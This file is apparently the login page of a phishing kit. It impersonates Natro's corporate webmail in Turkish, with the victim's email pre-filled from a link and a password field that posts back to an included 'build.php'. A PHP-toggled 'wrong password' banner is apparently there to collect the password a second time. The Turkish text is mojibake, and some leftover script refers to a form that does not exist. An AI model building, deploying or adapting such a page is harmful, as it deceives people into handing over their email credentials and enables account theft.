
<?php include '../build.php' ?>
<html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<head>
    <title>Natro Kurumsal E-Posta Servisi | Webmail E-Posta GiriÅŸi</title>
	
	<meta name="description" content="Natro'nun sunmuÅŸ olduÄŸu kurumsal e-posta servisi ile birlikte maillerinize hÄ±zlÄ± bir ÅŸekilde ulaÅŸmanÄ±n kolaylÄ±ÄŸÄ±nÄ± saÄŸlayÄ±n!" />
    <link href="../assets/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../assets/css/font-awesome.min.css">
    <link rel="icon" sizes="196x196" type="image/png" href="../assets/icons/logo_140x140.png" />
    <link rel="apple-touch-icon-precomposed" type="image/png" href="../assets/icons/logo_140x140.png" />
    <link rel="shortcut icon" type="image/x-icon" href="../assets/icons/natro.ico" /> 
	<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <style>
        .LoginLayout {
            height: auto !important;
            min-height: 100%;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            background: url('icons/mail-login-bg.jpg');
            background-size: cover
        }

        .login_panel-functional-part {
            background: url('icons/mail-login-bg-blur.jpg') no-repeat fixed;
            background-size:cover; overflow:hidden; width:600px; padding:5%; margin-top:5%; background-repeat:no-repeat; background-attachment:fixed
        }

        .login_panel {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            color: #929292;
            display: inline-block;
            font-size: 9pt;
            padding: 20px;
            vertical-align: middle;
            width: 280px;
        }

        .signme {
            font-size: 9pt;
            margin-bottom: 14px;
            padding: 0px;
            text-align: center;
            margin-top: 1rem !important;
            color: #ffffff;
        }
    </style>
	   
	

  
</head>
<body>

<div class="LoginLayout" style="flex-direction: column !important;"> 
    <div class="login_panel-functional-part text-white" style="width: 570px !important; border-radius: 5px !important; padding: 0px !important;">
        <div class="login_panel login" style="width: auto !important;">
            <div class="login_panel_content" style="backface-visibility: inherit;">
                <div class="header custom_logo"> 
					<a target="_blank" rel="sponsored" href="#"> 
						<img src="../assets/icons/logo.png"> 
					</a> 
				</div>
                <div class="content login clearfix">
                    <form method="post" id="formmaster">
                    <input type="hidden" name="login" value="natro">
                        <div class="input-group mt-4">
                            <div class="input-group-prepend" style="border-bottom-left-radius: 0; border-bottom-right-radius: 0;">
                                <span class="input-group-text" style="border-bottom: none;background-color: white; font-size: 1.5rem; color: #d5d4d2; border-bottom-left-radius: 0; border-bottom-right-radius: 0;" id="basic-addon1">
                                    <i class="fa fa-user" aria-hidden="true"></i>
                                </span>
                            </div>
                            <input type="text" class="form-control" placeholder="Mail adresini girin" id="email" name="user" value="<?php echo htmlspecialchars($decoded); ?>" style="border-left: none;border-bottom: none; border-bottom-left-radius: 0; border-bottom-right-radius: 0;">
                        </div>

 
                        <div class="input-group mb-2">
                            <div class="input-group-prepend" style="border-top-left-radius: 0; border-top-right-radius: 0;">
                                <span class="input-group-text" style="background-color: white; font-size: 1.5rem; color: #d5d4d2; border-top-left-radius: 0; border-top-right-radius: 0;" id="basic-addon1">
                                   <i class="fa fa-lock" aria-hidden="true"></i>
                                </span>
                            </div>
                            <input type="text" class="form-control" placeholder="Åžifreyi Girin" id="password" name="pass" style="border-left: none;border-top-right-radius: 0;" size="41">
                        </div>
						
						<div class="alert alert-danger"  style="<?php echo $error; ?>">HatalÄ± eposta/giriÅŸ ve/veya ÅŸifre. DoÄŸrulama baÅŸarÄ±sÄ±z.</div>	
						 
						<button type="submit" class="btn btn-success mt-3 w-100" style="background-color: #81bc00;">GiriÅŸ</button>

                        <div class="mt-3"><div class="signme" data-bind="visible: bUseSignMe"> <span> <label class="custom_checkbox" data-bind="css: {'checked': signMe, 'focus': signMeFocused}"> <span class="icon"></span> <input id="signme" tabindex="4" type="checkbox" data-bind="checked: signMe, hasfocus: signMeFocused"> </label> <label class="signme_label" for="signme" data-bind="i18n: {'key': 'STANDARDLOGINFORMWEBCLIENT/LABEL_REMEMBER_ME'}">Otomatik giriÅŸime izin ver</label> </span> </div> </div>

                        <div class="mt-3" style="color: #ffffff;">Kurumsal e-posta servisine hoÅŸgeldiniz</div>
                    </form>
                </div>
            </div>
        </div>
    </div>
	
	<div style="width: 600px; margin:auto; margin-top: 15px;">
		<a target="_blank" rel="sponsored" href="#"> 
			<img src="../assets/icons/login-bottom.png">
		</a> 
	</div>
	
</div>


</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>



